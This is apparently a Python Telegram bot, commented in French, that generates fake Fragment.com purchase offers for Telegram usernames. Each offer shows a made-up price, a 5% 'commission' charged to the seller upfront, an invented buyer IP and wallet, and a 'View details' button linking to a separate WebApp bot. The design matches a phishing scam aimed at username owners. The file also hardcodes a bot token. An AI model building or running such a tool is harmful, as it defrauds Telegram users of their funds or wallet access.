import asyncio
import aiohttp
import sys
import os
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes
from telegram.error import NetworkError, TimedOut, Conflict

# Configuration simple du logging
import logging
import warnings
warnings.filterwarnings("ignore", category=RuntimeWarning)
logging.basicConfig(level=logging.ERROR)

# Configuration
BOT_TOKEN = '7975400880:AAFMJ5ya_sMdLLMb7OjSbMYiBr3IhZikE6c'
FIXED_CHAT_ID = 511758924
PORT = int(os.getenv('PORT', 10000))

print(f"🔍 DEBUG: BOT_TOKEN configuré: ✅")
print(f"🔍 DEBUG: CHAT_ID fixe: {FIXED_CHAT_ID}")
print(f"🔍 DEBUG: PORT: {PORT}")

# ===== SERVEUR HTTP POUR RENDER =====
class HealthCheckHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path in ['/', '/health']:
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(b'Fragment Bot is running successfully!')
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, format, *args):
        pass  # Supprime les logs HTTP

def start_health_server():
    """Démarre le serveur de santé pour Render"""
    try:
        server = HTTPServer(('0.0.0.0', PORT), HealthCheckHandler)
        print(f"🌐 Serveur de santé démarré sur port {PORT}")
        server.serve_forever()
    except Exception as e:
        print(f"❌ Erreur serveur de santé: {e}")

# ===== FONCTION PRIX TON =====
async def get_ton_price():
    """Récupère le prix du TON en USD via l'API DIA"""
    try:
        timeout = aiohttp.ClientTimeout(total=8)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(
                "https://api.diadata.org/v1/assetQuotation/Ton/0x0000000000000000000000000000000000000000"
            ) as response:
                if response.status == 200:
                    data = await response.json()
                    return float(data.get('Price', 5.50))
                else:
                    return 5.50
    except Exception:
        return 5.50

# ===== FONCTION GÉNÉRATION MESSAGE =====
async def generate_fragment_message(username, price):
    """Génère le message Fragment avec calculs en temps réel"""
    try:
        # Calculs
        commission = price * 0.05
        ton_to_usd = await get_ton_price()
        price_usd = price * ton_to_usd
        commission_usd = commission * ton_to_usd
        
        # Message personnalisé
        message = f"""We have received a purchase request for your username @{username.upper()} via Fragment.com. Below are the transaction details:

**• Offer Amount: 💎{price:g} TON (${price_usd:.2f} USD)
• Commission: 💎{commission:g} TON (${commission_usd:.2f} USD)**

Please note that a 5% commission is charged to the seller prior to accepting the deal. This ensures a secure and efficient transaction process.

Additional Information:
• Device: Safari on macOS  
• IP Address: 103.56.72.245
• Wallet: [EQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XG4U](https://tonviewer.com/EQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XG4U)

Important:
**• Please proceed only if you are willing to transform your username into a collectible. This action is irreversible.
• If you choose not to proceed, simply ignore this message.**"""

        # Bouton vers WebApp
        button_url = f"https://t.me/BidRequestWebApp_bot/WebApp?startapp={username}-{price:g}"
        keyboard = [[InlineKeyboardButton("View details", url=button_url)]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        return message, reply_markup
        
    except Exception as e:
        print(f"Erreur génération message: {e}")
        return None, None

# ===== GESTIONNAIRE D'ERREURS =====
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gestionnaire d'erreurs silencieux"""
    pass

# ===== COMMANDES TELEGRAM =====
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Commande /start"""
    try:
        if not update or not update.message:
            return
            
        user = update.effective_user
        chat_id = update.effective_chat.id
        
        message = f"""🤖 **Fragment Deal Generator**

Bonjour {user.first_name}! 

📱 **Votre Chat ID:** `{chat_id}`

Ce bot génère automatiquement des messages Fragment personnalisés.

**Commandes disponibles:**
• `/create username price` - Créer un message Fragment
• `/help` - Aide

💎 **Prêt à créer vos deals!**"""
        
        await update.message.reply_text(message, parse_mode='Markdown')
        print(f"✅ /start - {user.first_name} ({chat_id})")
        
    except Exception as e:
        print(f"Erreur start: {e}")

async def create_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Commande /create username price"""
    try:
        if not update or not update.message:
            return
            
        if len(context.args) != 2:
            await update.message.reply_text(
                "❌ **Usage:** `/create username price`\n"
                "📝 **Exemple:** `/create crypto 1000`",
                parse_mode='Markdown'
            )
            return
            
        username = context.args[0].strip().lower()
        
        try:
            price = float(context.args[1])
        except ValueError:
            await update.message.reply_text("❌ Format de prix invalide")
            return
        
        if price <= 0:
            await update.message.reply_text("❌ Le prix doit être supérieur à 0")
            return
            
        # Message de traitement
        await update.message.reply_text("⏳ **Génération du deal...**", parse_mode='Markdown')
        
        # Génération du message
        message, reply_markup = await generate_fragment_message(username, price)
        
        if message and reply_markup:
            await update.message.reply_text(
                message,
                reply_markup=reply_markup,
                parse_mode='Markdown'
            )
            
            await update.message.reply_text(
                f"✅ **Deal créé avec succès!**\n"
                f"🎯 @{username} - {price} TON",
                parse_mode='Markdown'
            )
            
            print(f"✅ Deal: @{username} - {price} TON")
        else:
            await update.message.reply_text("❌ Erreur lors de la génération")
            
    except Exception as e:
        print(f"Erreur create: {e}")
        try:
            await update.message.reply_text("❌ Erreur système")
        except:
            pass

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Commande d'aide"""
    try:
        if not update or not update.message:
            return
            
        help_text = """🤖 **Fragment Deal Generator - Aide**

**Commandes disponibles:**
• `/start` - Informations du bot
• `/create username price` - Créer un deal Fragment
• `/help` - Afficher cette aide

**Exemple d'utilisation:**
`/create crypto 1500`

**À propos:**
Ce bot génère des messages Fragment professionnels avec calculs automatiques en TON et USD.

💎 **Bot prêt à l'emploi!**"""
        
        await update.message.reply_text(help_text, parse_mode='Markdown')
        print("✅ Help affiché")
        
    except Exception as e:
        print(f"Erreur help: {e}")

# ===== FONCTION PRINCIPALE BOT =====
def run_telegram_bot_sync():
    """Lance le bot Telegram en mode synchrone"""
    try:
        print("🚀 Initialisation du bot Telegram...")
        
        # Configuration de l'application
        app = Application.builder().token(BOT_TOKEN).build()
        
        # Ajout des handlers
        app.add_error_handler(error_handler)
        app.add_handler(CommandHandler("start", start_command))
        app.add_handler(CommandHandler("create", create_command))
        app.add_handler(CommandHandler("help", help_command))
        
        print("✅ Bot configuré")
        print(f"💎 Chat ID configuré: {FIXED_CHAT_ID}")
        print("🔗 WebApp: BidRequestWebApp_bot/WebApp")
        print("\n📋 Commandes disponibles:")
        print("   • /start - Démarrer le bot")
        print("   • /create username price - Créer un deal")
        print("   • /help - Aide")
        
        print("🔄 Démarrage du polling...")
        
        # Démarrage en mode bloquant avec gestion d'erreurs
        app.run_polling(
            poll_interval=2.0,
            timeout=10,
            bootstrap_retries=5,
            read_timeout=10,
            write_timeout=10,
            connect_timeout=10,
            pool_timeout=10,
            drop_pending_updates=True,
            allowed_updates=['message'],
            close_loop=True
        )
        
        print("🛑 Bot arrêté")
        
    except KeyboardInterrupt:
        print("\n🛑 Arrêt demandé par l'utilisateur")
        
    except Conflict as e:
        print(f"❌ Conflit de bot: {e}")
        print("ℹ️ Vérifiez qu'aucune autre instance ne tourne")
        
    except Exception as e:
        print(f"❌ Erreur critique bot: {e}")
        
    finally:
        print("🔚 Nettoyage terminé")

# ===== FONCTION PRINCIPALE =====
def main():
    """Point d'entrée principal"""
    print("🚀 Démarrage Fragment Deal Generator...")
    print(f"🌐 URL publique: https://telegram-bot-vic3.onrender.com")
    
    try:
        # 1. Démarrage du serveur HTTP en arrière-plan
        health_thread = threading.Thread(target=start_health_server, daemon=True)
        health_thread.start()
        print("✅ Serveur de santé démarré en arrière-plan")
        
        # 2. Attendre un peu pour s'assurer que le serveur démarre
        import time
        time.sleep(2)
        
        # 3. Lancement du bot Telegram en premier plan
        print("🤖 Lancement du bot Telegram...")
        run_telegram_bot_sync()
        
    except KeyboardInterrupt:
        print("\n🛑 Arrêt par l'utilisateur")
        
    except Exception as e:
        print(f"❌ Erreur critique: {e}")
        sys.exit(1)
        
    finally:
        print("🔚 Application terminée")

if __name__ == '__main__':
    main()
